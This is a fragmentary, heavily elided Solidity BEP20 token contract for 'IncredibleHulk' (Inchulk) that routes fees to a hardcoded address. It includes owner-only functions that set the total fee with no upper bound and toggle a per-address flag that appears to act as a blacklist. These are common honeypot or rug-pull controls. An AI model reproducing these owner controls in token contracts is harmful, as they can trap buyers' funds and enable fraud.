...
contract Inchulk is IBEP20, Auth {
    ...
    string constant _name = "IncredibleHulk";
    string constant _symbol = "Inchulk";
    ...
    address private marketingFeeReceiver = 0x4463A965A0866D23551c5bE5DD6d884715198CD5;
    address private buybackFeeReceiver = 0x4463A965A0866D23551c5bE5DD6d884715198CD5;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Inchulk seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Inchulk seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Inchulk Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Inchulk TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Inchulk receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Inchulk receiver rejected ETH transfer");
    ...
    function setDLInchulk(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEInchulk(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenInchulk(address _token) public authorized {
        require(_token != address(this), "Inchulk Can't let you take all native token");
    ...
    function isOverLiquifiedInchulk(uint256 target, uint256 accuracy) public view returns (bool) {
